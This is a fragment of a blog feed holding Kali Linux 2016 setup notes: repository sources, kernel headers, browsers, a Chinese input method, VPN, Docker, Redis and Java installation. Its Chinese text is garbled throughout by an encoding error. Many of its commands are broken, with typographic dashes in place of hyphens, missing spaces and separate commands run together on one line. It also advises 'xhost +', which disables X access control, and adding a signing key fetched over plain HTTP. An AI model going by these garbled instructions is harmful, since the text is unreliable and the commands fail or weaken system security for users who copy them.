href="#kali-linux-apt-get-è¯ä¹¦æ ¡éªŒé”™è¯¯" class="headerlink" title="kali linux apt-get è¯ä¹¦æ ¡éªŒé”™è¯¯"></a>kali linux apt-get è¯ä¹¦æ ¡éªŒé”™è¯¯</h4><p>é”™è¯¯ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@teamserver:~# apt-get update</span><br><span class="line">Get:1 http://mirror.neostrada.nl/kali kali-rolling InRelease [30.5 kB]</span><br><span class="line">Err:1 http://mirror.neostrada.nl/kali kali-rolling InRelease</span><br><span class="line">  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">Fetched 30.5 kB in 1s (25.5 kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirror.neostrada.nl/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure><p>Kali è¯ä¹¦é“¾è¿‡æœŸ é‡æ–°ä¸‹è½½æ–°çš„è¯ä¹¦é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O - archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure><p>####å®‰è£…32ä½è¿è¡Œåº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install lib32z1 lib32ncurses5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;è™šæ‹Ÿæœºå®‰è£…å¢å¼º&quot;&gt;&lt;a href=&quot;#è™šæ‹Ÿæœºå®‰è£…å¢å¼º&quot; class=&quot;headerlink&quot; title=&quot;è™šæ‹Ÿæœºå®‰è£…å¢å¼º&quot;&gt;&lt;/a&gt;è™šæ‹Ÿæœºå®‰è£…å¢å¼º&lt;/h4&gt;&lt;h5 id=&quot;1-Kali-å®˜æ–¹å®‰è£…&quot;&gt;&lt;a href=&quot;#1-Kali-å®˜æ–¹å®‰è£…&quot; class=&quot;he
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali linux 2016 ä½¿ç”¨æŒ‡å—(ä¸€)</title>
    <link href="http://zer0yu.github.io/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/"/>
    <id>http://zer0yu.github.io/2017/01/21/kali-linux-2016-ä½¿ç”¨æŒ‡å—-ä¸€/</id>
    <published>2017-01-21T14:10:21.000Z</published>
    <updated>2017-01-21T14:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>Kali Linuxå®˜æ–¹äº8æœˆ30æ—¥å‘å¸ƒKali Linux 2016çš„ç¬¬äºŒä¸ªç‰ˆæœ¬Kali Linux 2016.2ã€‚è¯¥ç‰ˆæœ¬è·ç¦»Kali Linux 2016.1ç‰ˆæœ¬å‘å¸ƒï¼Œå·²ç»æœ‰7ä¸ªæœˆã€‚åœ¨è¿™æœŸé—´ï¼Œåœ¨Kali Linux 2016.2ç‰ˆæœ¬å‘å¸ƒçš„è¿™æ®µæ—¶é—´ï¼ŒKali Linuxå®˜æ–¹å¢è¡¥äº†94ä¸ªæ›´æ–°ã€‚</p><p>ä¸»è¦çš„æ›´æ–°å¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ï¼š</p><ul><li><p>Kali Linux 2016ç³»ç»Ÿä¸­çš„éŸ³é‡è°ƒæ•´æŒ‰é’®å½’å¹¶åˆ°å³ä¸Šè§’çš„å…³é—­æŒ‰é’®ï¼Œç‚¹å‡»å…³é—­æŒ‰é’®ï¼Œå°±å¯ä»¥çœ‹åˆ°éŸ³é‡è°ƒæ•´æ»‘å—æŒ‰é’®ã€‚</p></li><li><p>ä½¿ç”¨Kali Linux 2016ç³»ç»Ÿåœ¨VMWareè™šæ‹Ÿæœºæ—¶ï¼Œåœ¨å®‰è£…å¢å¼ºå·¥å…·open-vm-toolsåï¼Œå¤åˆ¶è¾ƒå¤§æ–‡ä»¶ï¼Œä¼šå‡ºç°å¤åˆ¶è¿›åº¦å¯¹è¯æ¡†ã€‚è¯¥å¯¹è¯æ¡†æ¶ˆå¤±åï¼Œæ–‡ä»¶å¹¶æ²¡æœ‰å‡ºç°åœ¨ç›®æ ‡ä½ç½®ã€‚è¿™æ—¶ï¼Œå†æ¬¡ç²˜è´´ä¸€æ¬¡ï¼Œå°±å¯ä»¥äº†ã€‚å¦‚æœè¿˜æ˜¯æ²¡æœ‰è¦å¤åˆ¶çš„æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ ¹ç›®å½•ä¸‹çš„/tmp/VMwareDnDä¸­æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶å¤¹ã€‚å¤åˆ¶çš„æ–‡ä»¶ä¿å­˜åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­ã€‚</p></li><li><p>Kali Linux 2016.2é»˜è®¤æµè§ˆå™¨ä¸å†æ˜¯Iceweaselï¼Œæ›¿æ¢ä¸ºFireFox ESRã€‚è¯¥ç‰ˆæœ¬ä¸ä¼šåƒFireFoxæ™®é€šç‰ˆæœ¬é¢‘ç¹æ›´æ–°</p><p><img src="https://www.kali.org/wp-content/uploads/2016/08/gnome-1024x768.png" alt="1"></p><p>â€‹</p></li></ul><p>å…³äºkaliä½¿ç”¨å‰çš„ä¸€äº›é…ç½®ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œä½†æ˜¯ä¸æ˜¯è€å°±æ˜¯å¾ˆä¸å®ç”¨ã€‚è€Œä¸”ç°åœ¨kaliå·²ç»æ›´æ–°åˆ°äº†2016.2ç‰ˆï¼Œå¤§å¤šæ–°æ‰‹è‚¯å®šéƒ½æƒ³å®‰è£…æœ€æ–°ç‰ˆè¿›è¡Œå°è¯•ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘å°±ç®€è®°ä¸€ä¸‹æˆ‘å®‰è£…å’Œä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¯¹ä¸€äº›é—®é¢˜çš„è§£å†³ã€‚</p><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>å…·ä½“çš„å®‰è£…æ­¥éª¤å°±ä¸è¯´äº†ï¼Œå¤§å®¶éƒ½æ‡‚å¾—</p><p>å¯ä»¥å‚è€ƒï¼š<a href="http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html" target="_blank" rel="noopener">ã€Šè™šæ‹Ÿæœºå®‰è£…kali2.0ã€‹</a></p><p>ä¸æƒ³è£…çš„ï¼Œå®˜æ–¹ä¹Ÿæä¾›äº†ovaæ–‡ä»¶ï¼Œå¯ä»¥ä¸€é”®å¯¼å…¥è™šæ‹Ÿæœºã€‚</p><p>åœ¨è¿‡å»çš„å‡ ä¸ªæœˆé‡Œï¼Œkaliå®˜æ–¹å¢åŠ äº†æ–°çš„ç›¸å…³å·¥å…·ï¼Œä¿®å¤äº†å›ºå®šçš„å„ç§bugå’Œæ“ä½œç³»ç»Ÿçš„æ”¹è¿›ã€‚ä¸€äº›Busyboxæ·»åŠ äº†HTTPSæ”¯æŒï¼Œç°åœ¨å¯ä»¥è®¾ç½®å®‰å…¨çš„æ”¯æŒSSLçš„kaliï¼Œæ›´æ–¹ä¾¿å¿«æ·çš„å®‰è£…kaliã€‚</p><h4 id="ç³»ç»Ÿæ›´æ–°"><a href="#ç³»ç»Ÿæ›´æ–°" class="headerlink" title="ç³»ç»Ÿæ›´æ–°"></a>ç³»ç»Ÿæ›´æ–°</h4><p>kali linuxçš„æ›´æ–°æºå¾ˆé‡è¦ï¼Œä¸€å®šè¦é€‰å¥½ï¼Œrollingçš„é€‰rollingçš„æºã€‚</p><p>é¦–å…ˆï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>ç„¶åå¤åˆ¶ç²˜è´´ä¸‹é¢çš„æº:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">kaliå®˜æ–¹æº</span></span><br><span class="line"></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ä¸­ç§‘å¤§çš„æº</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">é˜¿é‡Œäº‘æº</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure><p>ç„¶åæ›´æ–°å¹¶å®‰è£…:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…å†…æ ¸å¤´ï¼ˆè¿™ä¸ªå¾ˆå¤šäººéƒ½åœ¨é—®æ€ä¹ˆåŠï¼‰"><a href="#å®‰è£…å†…æ ¸å¤´ï¼ˆè¿™ä¸ªå¾ˆå¤šäººéƒ½åœ¨é—®æ€ä¹ˆåŠï¼‰" class="headerlink" title="å®‰è£…å†…æ ¸å¤´ï¼ˆè¿™ä¸ªå¾ˆå¤šäººéƒ½åœ¨é—®æ€ä¹ˆåŠï¼‰"></a>å®‰è£…å†…æ ¸å¤´ï¼ˆè¿™ä¸ªå¾ˆå¤šäººéƒ½åœ¨é—®æ€ä¹ˆåŠï¼‰</h4><p>æˆ‘ç»™å‡ºæˆ‘çš„è§£å†³åŠæ³•ï¼Œæ€»ä¹‹è¿˜æ˜¯å‡çº§å†…æ ¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r</span><br><span class="line">$ 4.3.0-kali1-amd64</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä½¿ç”¨æˆ‘ç»™å‡ºçš„æºè¿›è¡Œæ›´æ–°çš„è¯å°±ä¼šå‡çº§åˆ°4.6.0-kali1-amd64</p><p>è¿™æ—¶å€™ä½¿ç”¨å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥äº†ã€‚</p><h4 id="å®‰è£…æµè§ˆå™¨"><a href="#å®‰è£…æµè§ˆå™¨" class="headerlink" title="å®‰è£…æµè§ˆå™¨"></a>å®‰è£…æµè§ˆå™¨</h4><h5 id="1-æ±‰åŒ–ç«ç‹æµè§ˆå™¨"><a href="#1-æ±‰åŒ–ç«ç‹æµè§ˆå™¨" class="headerlink" title="1.æ±‰åŒ–ç«ç‹æµè§ˆå™¨"></a>1.æ±‰åŒ–ç«ç‹æµè§ˆå™¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iceweasel-l10n-zh-cn</span><br></pre></td></tr></table></figure><h5 id="2-å®‰è£…å¹¶ä½¿ç”¨chrome"><a href="#2-å®‰è£…å¹¶ä½¿ç”¨chrome" class="headerlink" title="2.å®‰è£…å¹¶ä½¿ç”¨chrome"></a>2.å®‰è£…å¹¶ä½¿ç”¨chrome</h5><p>å…ˆä¸‹è½½chromeçš„debå®‰è£…åŒ…</p><p>æ‰§è¡Œdpkg -i google-chrome-xxx.debä½ ä¼šå‘ç°æŠ¥é”™ï¼Œä¸ç”¨æ…Œæ¥ä¸‹æ¥æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptâ€“get install libappindicator1</span><br></pre></td></tr></table></figure><p>å¯èƒ½è¿˜ä¼šæŠ¥é”™ï¼Œåˆ«æ…Œï¼Œæ‰§è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><p>ç„¶åå®‰è£…å®Œæˆï¼Œä½†æ˜¯ä½ ä¼šå‘ç°ä¸èƒ½è¿è¡Œï¼ŒåŸå› æ˜¯æƒé™é—®é¢˜</p><p>æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªç”¨æˆ·:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser zeroyu</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€è·¯å›è½¦ï¼Œæœ€åæ•²Y</p><p>ä¹‹åæŒ‰æ¬¡åºæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xhost +</span><br><span class="line">$ su zeroyu</span><br></pre></td></tr></table></figure><p>ä¹‹åæ•²å…¥ google-chromeå°±å¥½äº†</p><h4 id="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"><a href="#å®‰è£…ä¸­æ–‡è¾“å…¥æ³•" class="headerlink" title="å®‰è£…ä¸­æ–‡è¾“å…¥æ³•"></a>å®‰è£…ä¸­æ–‡è¾“å…¥æ³•</h4><p>ä¸ªäººå–œæ¬¢æœç‹—è¾“å…¥æ³•ï¼Œæ‰€ä»¥å†æ¬¡ç»™å‡ºæœç‹—è¾“å…¥æ³•çš„å®‰è£…æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">dpkg -i sougoupinyinXXX.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure><p>æœ€åé‡å¯ç”µè„‘å°±å¥½äº†ã€‚ï¼ˆ<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">æœç‹—è¾“å…¥æ³•å®‰è£…åŒ…ä¸‹è½½</a>ï¼‰</p><h4 id="å®‰è£…ç™¾åº¦äº‘"><a href="#å®‰è£…ç™¾åº¦äº‘" class="headerlink" title="å®‰è£…ç™¾åº¦äº‘"></a>å®‰è£…ç™¾åº¦äº‘</h4><p>å®å®çš„å¥½å¤šå°ç§˜å¯†è¿˜è—åœ¨ä¸Šé¢å¿…é¡»å®‰è£…ä¸€ä¸‹</p><p>ä¾æ¬¡æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/LiuLang/bcloud-packages</span><br><span class="line">apt-get -f install</span><br><span class="line">dpkg -i bcloud-x.x.x.deb</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…ä¸ºçŸ¥ç¬”è®°"><a href="#å®‰è£…ä¸ºçŸ¥ç¬”è®°" class="headerlink" title="å®‰è£…ä¸ºçŸ¥ç¬”è®°"></a>å®‰è£…ä¸ºçŸ¥ç¬”è®°</h4><p>åˆ°<a href="http://ppa.launchpad.net/wiznote-team/ppa/ubuntu/pool/main/w/wiznote/" target="_blank" rel="noopener">wiznoteå®‰è£…åŒ…ä¸‹è½½åœ°å€</a>æ‰¾åˆ°ç›¸åº”çš„debå®‰è£…åŒ…</p><p>ç„¶åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg â€“i wiznote_2.3xxxx.deb</span><br></pre></td></tr></table></figure><h4 id="å®‰è£…shadowsocks"><a href="#å®‰è£…shadowsocks" class="headerlink" title="å®‰è£…shadowsocks"></a>å®‰è£…shadowsocks</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip installshadowsocksâ€“gtk</span><br></pre></td></tr></table></figure><p>ç»ˆç«¯è¾“å…¥shadowsocks-gtkæ•²å›è½¦å°±å¯ä»¥çœ‹åˆ°uiç•Œé¢äº†ã€‚</p><h4 id="è§£å†³å­—ä½“é‡å é—®é¢˜"><a href="#è§£å†³å­—ä½“é‡å é—®é¢˜" class="headerlink" title="è§£å†³å­—ä½“é‡å é—®é¢˜"></a>è§£å†³å­—ä½“é‡å é—®é¢˜</h4><p>è¿™é‡Œå…ˆè§£å†³ä¸‹ç¢°åˆ°çš„å‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptâ€“get install ttfâ€“wqyâ€“microhei ttfâ€“wqyâ€“zenhei xfontsâ€“wqy</span><br></pre></td></tr></table></figure><p>é‡å¯ç»ˆç«¯å°±å¥½äº†ï¼Œè¿™ä¸ªæœ€å¥½åœ¨å®‰è£…å†…æ ¸å¤´ä¹‹å‰å®Œæˆï¼</p><h4 id="VPNå®‰è£…"><a href="#VPNå®‰è£…" class="headerlink" title="VPNå®‰è£…"></a>VPNå®‰è£…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æœ€åä¸€è¡Œçš„managed=falseæ”¹ä¸ºmanaged=true</p><p>ç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aptâ€“get install networkâ€“managerâ€“openvpnâ€“gnome</span><br><span class="line">aptâ€“get install networkâ€“managerâ€“pptp</span><br><span class="line">aptâ€“get install networkâ€“managerâ€“pptpâ€“gnome</span><br><span class="line">aptâ€“get install networkâ€“managerâ€“strongswan</span><br><span class="line">aptâ€“get install networkâ€“managerâ€“vpnc</span><br><span class="line">aptâ€“get install networkâ€“managerâ€“vpncâ€“gnome</span><br><span class="line">/etc/init.d/networkâ€“manager restart</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo â€œauto loâ€ &gt; /etc/network/interfaces echo â€œiface lo inet loopbackâ€ &gt;&gt; /etc/network/interfaces service network-manager start</span><br></pre></td></tr></table></figure><h4 id="dockerå®‰è£…"><a href="#dockerå®‰è£…" class="headerlink" title="dockerå®‰è£…"></a>dockerå®‰è£…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aptâ€“get update</span><br><span class="line">aptâ€“get install docker.io</span><br></pre></td></tr></table></figure><h4 id="Rediså®‰è£…"><a href="#Rediså®‰è£…" class="headerlink" title="Rediså®‰è£…"></a>Rediså®‰è£…</h4><p><a href="http://redis.io/download" target="_blank" rel="noopener">redisä¸‹è½½</a></p><p>ä¸‹è½½å®Œåå…ˆç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar xvf redisâ€“x.x.x.tar.gz</span><br><span class="line">cd redisâ€“x.x.x</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>è€Œåå®‰è£…:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br><span class="line">cd utils</span><br><span class="line">sudo ./install_server.sh</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¸€æ­¥ä¸€æ­¥è®¾ç½®å°±å¥½</p><h4 id="Macå®‰è£…åå¯åŠ¨é—®é¢˜çš„è§£å†³"><a href="#Macå®‰è£…åå¯åŠ¨é—®é¢˜çš„è§£å†³" class="headerlink" title="Macå®‰è£…åå¯åŠ¨é—®é¢˜çš„è§£å†³"></a>Macå®‰è£…åå¯åŠ¨é—®é¢˜çš„è§£å†³</h4><p>å…¶å®å®‰è£…è·Ÿå…¶å®ƒéƒ½ä¸€æ ·ï¼Œå°±æ˜¯å®‰è£…åå¯åŠ¨è¦ç­‰å¥½ä¹…ï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥æ¯æ¬¡å¯åŠ¨éƒ½æŒ‰ä¸‹optionè¿›è¡Œé€‰æ‹©å¯åŠ¨ï¼‰</p><p>è§£å†³æ–¹æ³•å°±æ˜¯</p><p>æ’å…¥macOSçš„å®‰è£…å…‰ç›˜ï¼Œé‡æ–°å¯åŠ¨ï¼ŒæŒ‰ä½option é€šè¿‡å…‰ç›˜å¯åŠ¨ è¿›å…¥å®‰è£…ç•Œé¢ ä»èœå•é€‰æ‹©terminalï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bless â€“device /dev/disk0 â€“setBoot â€“legacy â€“verbose</span><br></pre></td></tr></table></figure><p>#è¿™é‡Œçš„disk0æ˜¯å®‰è£…grubçš„åˆ†åŒºï¼Œå¯ä»¥é€šè¿‡diskutil listæ¥è¿›è¡ŒæŸ¥çœ‹</p><p>æœ€å:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>okï¼Œè¿™æ ·å•å¼•å¯¼å®‰è£…å°±å®Œæˆäº†ã€‚</p><h4 id="ç½‘æ˜“äº‘éŸ³ä¹æ­£ç¡®å®‰è£…å§¿åŠ¿"><a href="#ç½‘æ˜“äº‘éŸ³ä¹æ­£ç¡®å®‰è£…å§¿åŠ¿" class="headerlink" title="ç½‘æ˜“äº‘éŸ³ä¹æ­£ç¡®å®‰è£…å§¿åŠ¿"></a>ç½‘æ˜“äº‘éŸ³ä¹æ­£ç¡®å®‰è£…å§¿åŠ¿</h4><p>ä¸‹è½½<a href="http://music.163.com/#/download" target="_blank" rel="noopener">ç½‘æ˜“äº‘éŸ³ä¹ï¼ˆdeepinç‰ˆï¼‰</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg â€“i ç½‘æ˜“äº‘.deb</span><br></pre></td></tr></table></figure><p>æ³¨æ„!ä¹‹åè¿˜è¦åˆ°/usr/shareç›®å½•ä¸‹çš„applicationç›®å½•æ‰¾åˆ°ç½‘æ˜“äº‘éŸ³ä¹ï¼Œå³é”®åœ¨å‘½ä»¤ååŠ ä¸€å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€”noâ€“sandbox</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±okäº†ã€‚</p><h4 id="å®‰è£…sun-java"><a href="#å®‰è£…sun-java" class="headerlink" title="å®‰è£…sun java"></a>å®‰è£…sun java</h4><ol><li><h5 id="ä¸‹è½½æœ€æ–°çš„JAVA-JDK"><a href="#ä¸‹è½½æœ€æ–°çš„JAVA-JDK" class="headerlink" title="ä¸‹è½½æœ€æ–°çš„JAVA JDK"></a>ä¸‹è½½æœ€æ–°çš„JAVA JDK</h5></li></ol><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">jdk-8u91-linux-x64</a></p><ol start="2"><li><h5 id="è§£å‹ç¼©æ–‡ä»¶å¹¶ç§»åŠ¨è‡³-opt"><a href="#è§£å‹ç¼©æ–‡ä»¶å¹¶ç§»åŠ¨è‡³-opt" class="headerlink" title="è§£å‹ç¼©æ–‡ä»¶å¹¶ç§»åŠ¨è‡³/opt"></a>è§£å‹ç¼©æ–‡ä»¶å¹¶ç§»åŠ¨è‡³/opt</h5></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf jdk-8u91-linux-x64.tar.gz</span><br><span class="line">mv jdk1.8.0_91 /opt</span><br><span class="line">cd /opt/jdk1.8.0_91</span><br></pre></td></tr></table></figure><ol start="3"><li><h5 id="è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®ç¯å¢ƒå˜é‡"></a>è®¾ç½®ç¯å¢ƒå˜é‡</h5></li></ol><p>1ï¼‰æ‰§è¡Œ gedit ~/.bashrc ï¼Œ å¹¶æ·»åŠ ä¸‹åˆ—å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># install JAVA JDK</span><br><span class="line">export JAVA_HOME=/opt/jdk1.8.0_91</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure><p>2ï¼‰æ‰§è¡Œ source ~/.bashrc</p><ol start="4"><li><h5 id="å®‰è£…å¹¶æ³¨å†Œ"><a href="#å®‰è£…å¹¶æ³¨å†Œ" class="headerlink" title="å®‰è£…å¹¶æ³¨å†Œ"></a>å®‰è£…å¹¶æ³¨å†Œ</h5></li></ol><p>æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1</span><br><span class="line">update-alternatives --set java /opt/jdk1.8.0_91/bin/java</span><br><span class="line">update-alternatives --set javac /opt/jdk1.8.0_91/bin/javac</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><h5 id="5-æµ‹è¯•"><a href="#5-æµ‹è¯•" class="headerlink" title="5. æµ‹è¯•"></a>5. æµ‹è¯•</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br><span class="line">#output </span><br><span class="line">java version &quot;1.8.0_91&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_91-b14)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode)</span><br></pre></td></tr></table></figure><h4 id="è§£å†³sublimeçš„ä¸­æ–‡è¾“å…¥é—®é¢˜"><a href="#è§£å†³sublimeçš„ä¸­æ–‡è¾“å…¥é—®é¢˜" class="headerlink" 